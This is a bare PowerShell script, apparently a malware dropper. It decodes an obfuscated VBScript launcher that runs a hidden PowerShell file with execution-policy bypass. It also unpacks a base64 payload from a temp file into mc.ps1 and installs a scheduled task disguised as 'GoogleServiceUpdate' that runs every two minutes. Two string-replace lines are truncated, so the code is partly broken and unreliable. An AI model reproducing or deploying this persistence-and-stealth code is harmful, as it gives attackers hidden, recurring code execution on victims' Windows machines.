
$path= "$env:userprofile\appdata\local\microsoft\Windows"

if(-not(Test-Path -Path($path)))
{mkdir $path}

$fileout="$path\L69742.vbs";

$encstrvbs="c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K";

$bytevbs=[System.Convert]::FromBase64String($encstrvbs);

$strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);

$strvbs = $strvbs.replace('

set-content $fileout $strvbs;

$tmpfile="$env:TEMP\U1848931.TMP";



$pscode_b64  =get-content $tmpfile | out-string;

$pscode_b64=$pscode_b64.trim();


$pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))

$id = [string](get-random -min 10000 -max 100000)

$pscode = $pscode.replace('

set-content "$path\mc.ps1" $pscode


$taskstr="schtasks /create /F /sc minute /mo 2 /tn ""GoogleServiceUpdate"" /tr ""\""$fileout""\""   ";



iex 'cmd /c $taskstr';

